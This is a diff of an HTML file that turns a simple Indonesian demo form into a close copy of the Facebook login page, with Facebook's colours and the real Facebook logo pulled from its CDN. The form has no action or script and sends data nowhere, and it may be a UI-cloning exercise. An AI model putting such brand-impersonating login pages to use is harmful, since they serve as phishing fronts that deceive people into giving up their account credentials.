@@ -3,60 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UI Dasar</title>
+    <title>Login dengan Facebook</title>
     <style>
-        /* CSS Dasar untuk UI */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
         }
-        header {
-            background-color: #333;
-            color: white;
-            padding: 1em;
-            text-align: center;
-        }
-        .container {
+
+        .login-container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
             padding: 20px;
-            max-width: 800px;
-            margin: auto;
-        }
-        .button {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            padding: 15px 32px;
+            max-width: 350px;
+            width: 100%;
             text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 4px 2px;
-            cursor: pointer;
         }
-        .button:hover {
-            background-color: #45a049;
+
+        .logo {
+            width: 176px;
+            margin-bottom: 20px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="email"], input[type="password"] {
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>UI Dasar</h1>
-    </header>
-
-    <div class="container">
-        <h2>Selamat Datang</h2>
-        <p>Ini adalah contoh UI sederhana menggunakan HTML dan CSS.</p>
-        
-        <button class="button">Klik Saya</button>
-        
-        <form>
-            <label for="nama">Nama:</label><br>
-            <input type="text" id="nama" name="nama"><br>
-            <label for="email">Email:</label><br>
-            <input type="email" id="email" name="email"><br><br>
-            <input type="submit" value="Submit" class="button">
+    <div class="login-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
+        <form class="login-form">
+            <input type="email" placeholder="Email atau nomor telepon" required>
+            <input type="password" placeholder="Kata sandi" required>
+            <button type="submit" class="login-button">Masuk</button>
+            <a href="#" class="forgot-password">Lupa kata sandi?</a>
+            <button type="button" class="create-account">Buat Akun Baru</button>
         </form>
     </div>
 </body>
